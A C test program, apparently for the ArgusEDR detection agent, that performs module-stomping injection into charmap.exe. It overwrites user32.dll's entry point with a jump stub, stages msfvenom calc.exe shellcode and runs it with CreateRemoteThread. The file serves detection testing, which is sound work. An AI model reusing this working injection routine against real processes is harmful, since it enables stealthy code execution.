/*
 * test_ModuleStomping.c  (x64)
 * Module stomping adapted for ArgusEDR.
 *
 * Victim:  charmap.exe  (spawned, running)
 * Target:  user32.dll entry point inside the victim
 *          (user32.dll is loaded in every GUI process -- no pre-injection needed)
 * Payload: msfvenom windows/x64/exec CMD=calc.exe
 *
 * Attack sequence (hooks active):
 *   1. VirtualAllocEx(RWX)           -> private staging buffer     (MEDIUM)
 *   2. WriteProcessMemory            -> 12-byte JMP stub -> user32.dll entry  (STOMP, HIGH)
 *   3. WriteProcessMemory            -> shellcode -> staging buffer (HIGH, YARA -> CRITICAL)
 *   4. CreateRemoteThread(u32_entry) -> JMPs to shellcode in staging buffer
 *
 * Detection chain (requires argus_agent.exe running):
 *
 *   VirtualAllocEx(RWX) hook   -> MEDIUM for victim PID
 *   PE-Sieve fast watcher      -> FINDING_PRIVATE_EXECUTABLE corroboration (200 ms)
 *   WriteProcessMemory hook    -> HIGH  (stomp; staging buffer still empty -- YARA: no match)
 *   PE-Sieve structural scan   -> FINDING_CODE_CAVE  (accelerated scan ~3 s after watcher)
 *   WriteProcessMemory hook    -> HIGH (shellcode staged)
 *                              -> YARA scan -> Metasploit rule -> CRITICAL  [SOURCE: YARA]
 *   CreateRemoteThread hook    -> CRITICAL (already set, late evidence)
 *   Agent kill-switch          -> victim terminated  (500 ms grace)
 *
 * Workflow:
 *   1. Start argus_agent.exe
 *   2. Start test_ModuleStomping.exe
 *      -> prints stomper PID and victim PID immediately
 *   3. Inject monitoring DLLs (order does not matter):
 *        injector.exe <victim_pid>   argus_pesieve.dll   (PE-Sieve into victim)
 *        injector.exe <stomper_pid>  argus_hook.dll      (hooks into stomper)
 *   4. Press ENTER -> stomping sequence runs automatically
 *   5. Watch agent output; press ENTER again to exit
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <processthreadsapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <TlHelp32.h>

/* ── Helper: base address of a named DLL in a remote process ────────────── */
static DWORD_PTR get_remote_dll_base(HANDLE hProcess, const char* dll_name)
{
    HANDLE snap = CreateToolhelp32Snapshot(
        TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, GetProcessId(hProcess));
    if (snap == INVALID_HANDLE_VALUE) return 0;

    MODULEENTRY32W me;
    me.dwSize = sizeof(me);
    DWORD_PTR base = 0;
    if (Module32FirstW(snap, &me)) {
        do {
            char name_a[MAX_MODULE_NAME32 + 1] = {0};
            WideCharToMultiByte(CP_ACP, 0, me.szModule, -1,
                                name_a, sizeof(name_a), NULL, NULL);
            if (_stricmp(name_a, dll_name) == 0) {
                base = (DWORD_PTR)me.modBaseAddr;
                break;
            }
        } while (Module32NextW(snap, &me));
    }
    CloseHandle(snap);
    return base;
}

/* ── Helper: AddressOfEntryPoint of a remote DLL ───────────────────────── */
static DWORD_PTR get_remote_entry_point(HANDLE hProcess, DWORD_PTR base)
{
    if (!hProcess || !base) return 0;

    IMAGE_DOS_HEADER dos = {0};
    SIZE_T bytes_read = 0;
    if (!ReadProcessMemory(hProcess, (LPCVOID)base, &dos, sizeof(dos), &bytes_read) ||
        dos.e_magic != IMAGE_DOS_SIGNATURE)
        return 0;

    IMAGE_NT_HEADERS64 nth = {0};
    if (!ReadProcessMemory(hProcess,
                           (LPCVOID)(base + dos.e_lfanew),
                           &nth, sizeof(nth), &bytes_read) ||
        nth.Signature != IMAGE_NT_SIGNATURE)
        return 0;

    return base + nth.OptionalHeader.AddressOfEntryPoint;
}

int main(void)
{
    /* ── msfvenom windows/x64/exec CMD=calc.exe EXITFUNC=thread ─────────── */
    unsigned char shellcode[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
    SIZE_T shellcode_size = sizeof(shellcode);

    /* ── Spawn victim (let it run so its DLLs fully initialize) ─────────── */
    /* notepad.exe and mspaint.exe are Store/AppContainer apps on Windows 11 and
     * block cross-process memory operations even for the same user.
     * charmap.exe (Character Map) is still a classic Win32 GUI process on all
     * Windows 10/11 builds and is reliably injectable. */
    char victim_path[MAX_PATH] = {0};
    GetSystemDirectoryA(victim_path, MAX_PATH);
    strncat(victim_path, "\\charmap.exe", MAX_PATH - strlen(victim_path) - 1);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    if (!CreateProcessA(NULL, victim_path, NULL, NULL, FALSE, 0,
                        NULL, NULL, &si, &pi)) {
        fprintf(stderr, "  ERROR  CreateProcess(charmap) failed (%lu)\n", GetLastError());
        return 1;
    }

    /* Give charmap time to finish initializing (loads user32.dll, gdi32.dll, etc.). */
    Sleep(2000);

    printf("\n  ArgusEDR  /  Module Stomping test  (x64)\n");
    printf("  ----------------------------------------\n");
    printf("  Victim  (charmap.exe) PID : %lu   <- inject argus_pesieve.dll here\n",
           GetProcessId(pi.hProcess));
    printf("  Stomper (this process) PID: %lu   <- inject argus_hook.dll here\n\n",
           GetProcessId(GetCurrentProcess()));

    printf("  Target DLL: user32.dll  (always loaded in notepad -- no pre-injection needed)\n\n");

    printf("  Inject monitoring DLLs (order does not matter):\n");
    printf("    injector.exe %-6lu argus_pesieve.dll   (PE-Sieve into victim)\n",
           GetProcessId(pi.hProcess));
    printf("    injector.exe %-6lu argus_hook.dll      (hooks into stomper)\n\n",
           GetProcessId(GetCurrentProcess()));
    printf("  Do both injections, then press ENTER to begin stomping...\n");
    getchar();

    /* ── Locate user32.dll entry point in victim ─────────────────────────── */
    DWORD_PTR u32_base = get_remote_dll_base(pi.hProcess, "user32.dll");
    if (!u32_base) {
        fprintf(stderr, "  ERROR  user32.dll not found in victim PID %lu.\n",
                GetProcessId(pi.hProcess));
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return 1;
    }

    DWORD_PTR u32_entry = get_remote_entry_point(pi.hProcess, u32_base);
    if (!u32_entry) {
        fprintf(stderr, "  ERROR  Could not read user32.dll entry point.\n");
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return 1;
    }

    printf("\n  [FOUND]   user32.dll base          0x%p\n", (void*)u32_base);
    printf("            user32.dll entry point   0x%p\n\n", (void*)u32_entry);

    /* ── Stomping sequence (hooks are now active) ────────────────────────── */
    printf("  ---- Stomping sequence (hooks active) --------------------------\n\n");

    /*
     * Step 1: Allocate a private RWX staging buffer in the victim.
     * Hook intercepts VirtualAllocEx(RWX):
     *   -> has_allocated = true  +  has_protected = true  -> MEDIUM
     * PE-Sieve fast watcher reports FINDING_PRIVATE_EXECUTABLE within 200 ms.
     */
    LPVOID staging = VirtualAllocEx(
        pi.hProcess, NULL, shellcode_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!staging) {
        fprintf(stderr, "  ERROR  VirtualAllocEx (staging buffer) failed (%lu)\n",
                GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return 1;
    }
    printf("  [ALLOC]   VirtualAllocEx -> staging buffer @ 0x%p  (RWX, %zu bytes)\n",
           staging, shellcode_size);
    printf("            Hook: MEDIUM for victim PID %lu\n", GetProcessId(pi.hProcess));
    printf("            PE-Sieve: FINDING_PRIVATE_EXECUTABLE within 200 ms\n\n");

    printf("  [WAIT]    2s -- PE-Sieve fast watcher observing new RWX region...\n\n");
    Sleep(2000);

    /*
     * Step 2: STOMP -- overwrite user32.dll entry point with a 12-byte
     * absolute JMP trampoline that redirects into the staging buffer.
     *
     *   48 B8 <addr64>   MOV RAX, staging
     *   FF E0            JMP RAX
     *
     * Stomp happens BEFORE shellcode write so the PE-Sieve structural scan
     * (triggered by the fast watcher seeing the new RWX region ~500 ms ago)
     * runs while the staging buffer is still empty -- YARA sees no shellcode
     * yet -- and catches the user32.dll code cave.  The accelerated structural
     * scan fires ~3 s after the fast watcher set the trigger flag.
     *
     * WriteProcessMemory can write to PAGE_EXECUTE_READ MEM_IMAGE pages from
     * a process with PROCESS_VM_WRITE; no VirtualProtect call required.
     * Hook fires: has_written = true  -> HIGH.
     * YARA scan triggers: staging buffer still empty -- no Metasploit match.
     */
    unsigned char jmp_stub[12];
    jmp_stub[0]  = 0x48;        /* REX.W */
    jmp_stub[1]  = 0xB8;        /* MOV RAX, imm64 */
    memcpy(&jmp_stub[2], &staging, 8);
    jmp_stub[10] = 0xFF;        /* JMP r/m64 */
    jmp_stub[11] = 0xE0;        /* ModRM: JMP RAX */

    if (!WriteProcessMemory(pi.hProcess, (LPVOID)u32_entry,
                            jmp_stub, sizeof(jmp_stub), NULL)) {
        fprintf(stderr, "  WARN   Stomp WriteProcessMemory failed (%lu) -- continuing\n",
                GetLastError());
    } else {
        printf("  [STOMP]   WriteProcessMemory -> JMP stub -> user32.dll entry @ 0x%p\n",
               (void*)u32_entry);
        printf("            Hook: HIGH for victim PID %lu  (has_written + has_protected)\n",
               GetProcessId(pi.hProcess));
        printf("            YARA scan: staging buffer empty -- no match\n");
        printf("            In-memory user32.dll now diverges from the on-disk image.\n\n");
    }

    /*
     * Wait for the accelerated structural scan.  The PE-Sieve fast watcher set
     * g_trigger_structural_scan when it first saw the RWX region; scan_thread
     * picked it up within 500 ms and then slept 3 s before running PESieve_scan_ex.
     * That structural scan will see the stomped entry point and report
     * FINDING_CODE_CAVE, which the correlator prints as a PE-Sieve evidence block.
     */
    printf("  [WAIT]    4s -- PE-Sieve structural scan window (code-cave detection)...\n\n");
    Sleep(4000);

    /*
     * Step 3: Write shellcode into the staging buffer.
     * Hook intercepts WriteProcessMemory:
     *   -> has_written already set  -> still HIGH
     * YARA scan triggers: Metasploit pattern found in the RWX region -> CRITICAL.
     */
    if (!WriteProcessMemory(pi.hProcess, staging,
                            shellcode, shellcode_size, NULL)) {
        fprintf(stderr, "  ERROR  WriteProcessMemory (shellcode -> staging) failed (%lu)\n",
                GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
        return 1;
    }
    printf("  [WRITE]   WriteProcessMemory -> shellcode (%zu bytes) -> staging buffer\n",
           shellcode_size);
    printf("            YARA scan: Metasploit shellcode pattern -> CRITICAL\n\n");

    printf("  [WAIT]    2s -- CRITICAL grace period / late evidence window...\n\n");
    Sleep(2000);

    /*
     * Step 4: Execute -- remote thread starting at user32.dll's entry point,
     * which immediately JMPs into the shellcode in the staging buffer.
     * Hook intercepts CreateRemoteThread:
     *   -> has_remote_thread = true  -> CRITICAL  [SOURCE: Hook]
     * Agent kills victim in 500 ms; calc.exe likely never opens.
     */
    HANDLE rthread = CreateRemoteThread(
        pi.hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)u32_entry, NULL, 0, NULL);
    if (!rthread) {
        fprintf(stderr, "  WARN   CreateRemoteThread failed (%lu)\n", GetLastError());
    } else {
        printf("  [EXEC]    CreateRemoteThread -> user32.dll entry @ 0x%p\n",
               (void*)u32_entry);
        printf("            Thread JMPs to shellcode in staging buffer.\n");
        printf("            Hook: CRITICAL for victim PID %lu  (has_remote_thread)\n\n",
               GetProcessId(pi.hProcess));
        CloseHandle(rthread);
    }

    /* ── Summary ─────────────────────────────────────────────────────────── */
    printf("  ----------------------------------------\n");
    printf("  Stomping complete.  Expected agent output for victim PID %lu:\n\n",
           GetProcessId(pi.hProcess));
    printf("    MEDIUM                  VirtualAllocEx hook  (RWX staging buffer)\n");
    printf("    PRIVATE_EXECUTABLE      PE-Sieve fast watcher corroboration (<200 ms)\n");
    printf("    HIGH                    WriteProcessMemory hook  (stomp; staging empty)\n");
    printf("    CODE_CAVE               PE-Sieve structural scan  (~3-4 s after stomp)\n");
    printf("    CRITICAL                YARA: Metasploit shellcode in RWX region\n");
    printf("    CreateRemoteThread      late evidence after CRITICAL\n\n");
    printf("  Stomper PID:          %lu\n", GetProcessId(GetCurrentProcess()));
    printf("  Victim PID:           %lu\n", GetProcessId(pi.hProcess));
    printf("  user32.dll base:      0x%p\n", (void*)u32_base);
    printf("  user32.dll entry:     0x%p\n", (void*)u32_entry);
    printf("  Shellcode staging:    0x%p\n\n", staging);

    printf("  Press ENTER to exit...\n");
    getchar();

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
